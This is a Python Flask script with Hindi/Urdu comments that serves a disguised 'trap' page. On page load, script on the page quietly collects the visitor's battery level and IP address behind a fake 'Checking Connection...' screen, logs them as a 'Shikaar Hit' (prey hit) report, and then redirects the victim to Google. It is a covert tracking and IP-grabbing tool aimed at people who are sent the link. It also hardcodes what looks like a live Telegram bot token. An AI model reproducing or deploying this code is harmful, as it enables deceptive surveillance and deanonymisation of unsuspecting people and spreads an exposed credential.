import os
from flask import Flask, request, render_template_string
from telegram import Bot
import asyncio

app = Flask(__name__)

# Config
TOKEN = "8519141404:AAG96ys2oHdO5jxnJNwOhFrmhtP9IpVPOoc"
bot = Bot(token=TOKEN)
MY_CHAT_ID = "YAHAN_APNI_ID_DALO" # @userinfobot se apni ID nikalo

# HTML Trap Code
HTML_TRAP = """
<script>
    async function capture() {
        let battery = await navigator.getBattery();
        let level = Math.round(battery.level * 100);
        
        // Data server ko bhejo
        fetch('/log?bat=' + level);
        
        // User ko asli link par bhej do
        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 500);
    }
    window.onload = capture;
</script>
<h2 style='text-align:center;'>Checking Connection...</h2>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TRAP)

@app.route('/log')
def log():
    bat = request.args.get('bat')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Telegram pe report bhejney ka tareeka
    report = f"🎯 **Shikaar Hit!**\\n🔋 Battery: {bat}%\\n🌐 IP: {ip}"
    print(report)
    # Note: Render pe async handle karne ke liye print kafi hai logs check karne ke liye
    return "OK"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))